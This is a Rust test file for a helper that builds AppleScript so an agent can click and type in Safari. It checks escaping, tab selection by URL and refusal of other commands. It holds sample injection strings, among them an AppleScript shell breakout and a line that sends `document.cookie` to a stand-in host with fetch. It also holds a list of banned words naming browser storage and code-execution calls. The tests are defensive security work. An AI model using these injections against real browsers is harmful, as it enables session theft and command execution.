use super::act::{act_script, USAGE};

/// The double quotes of `s` that no backslash escapes: the ones AppleScript reads as the ends of a string.
fn bare_quotes(s: &str) -> usize {
    let (mut n, mut slashes) = (0, 0);
    for c in s.chars() {
        match c {
            '\\' => slashes += 1,
            '"' if slashes % 2 == 0 => {
                n += 1;
                slashes = 0
            }
            _ => slashes = 0,
        }
    }
    n
}

#[test]
fn a_click_runs_the_fixed_script_on_the_current_tab_or_the_named_one() {
    let here = act_script("click", "Guardar oferta", "", "").unwrap();
    assert!(
        here.starts_with("tell application \"Safari\" to do JavaScript \"(function(want){")
            && here.ends_with("\" in current tab of front window"),
        "a click without a URL acts on the current tab:\n{here}"
    );
    assert!(
        here.contains("})(\\\"Guardar oferta\\\")"),
        "the words ride in as a JSON string:\n{here}"
    );
    assert_eq!(
        bare_quotes(&here),
        4,
        "two AppleScript strings: \"Safari\" and the JavaScript"
    );
    let tab = act_script("click", "#save", "", "https://dev.epicgames.com/").unwrap();
    assert!(
        tab.contains(
            "if (URL of t) starts with \"https://dev.epicgames.com/\" then return do JavaScript \""
        ) && tab.contains("error \"no tab starts with that URL\""),
        "a URL picks the first tab that starts with it:\n{tab}"
    );
}

#[test]
fn typing_carries_the_field_and_the_text_as_json_strings() {
    let s = act_script("type", "Precio", "9,99 €\nsegunda línea", "").unwrap();
    assert!(
        s.contains("})(\\\"Precio\\\",\\\"9,99 €\\\\nsegunda línea\\\")"),
        "field and text are JSON strings, a newline kept as \\n:\n{s}"
    );
    assert_eq!(
        bare_quotes(&s),
        4,
        "two AppleScript strings: \"Safari\" and the JavaScript"
    );
}

#[test]
fn no_word_of_the_agent_ends_the_string_or_runs_as_code() {
    for evil in [
        "\") & (do shell script \"id\") & (\"",
        "\\\") & (do shell script \\\"id\\\") & (\\\"",
        "'); fetch('https://x/'+document.cookie); ('",
    ] {
        for s in [
            act_script("click", evil, "", "").unwrap(),
            act_script("type", "a", evil, "").unwrap(),
        ] {
            assert_eq!(
                bare_quotes(&s),
                4,
                "the words stay inside the JavaScript's string:\n{s}"
            );
        }
    }
    let tab = act_script(
        "click",
        "x",
        "",
        "https://x/\" & (do shell script \"id\") & \"",
    )
    .unwrap();
    assert_eq!(
        bare_quotes(&tab),
        8,
        "the URL is escaped too (the script's own four strings):\n{tab}"
    );
}

#[test]
fn the_fixed_script_never_reads_what_the_owner_keeps() {
    let s = act_script("type", "a", "b", "").unwrap() + &act_script("click", "a", "", "").unwrap();
    for word in [
        "cookie",
        "localStorage",
        "sessionStorage",
        "indexedDB",
        "fetch(",
        "XMLHttpRequest",
        "eval(",
    ] {
        assert!(!s.contains(word), "the script holds no {word}");
    }
}

#[test]
fn what_is_not_a_click_or_a_typing_is_refused() {
    for (cmd, target, text, url) in [
        ("click", "", "", ""),
        ("click", "  ", "", ""),
        ("click", "a\u{7}", "", ""),
        ("click", "a", "", "https://x/\n"),
        ("type", "a", "b\u{1b}", ""),
        ("eval", "a", "", ""),
        ("open", "a", "", ""),
    ] {
        assert_eq!(
            act_script(cmd, target, text, url),
            Err(USAGE.to_string()),
            "{cmd} {target:?} {text:?} {url:?} is refused"
        );
    }
}
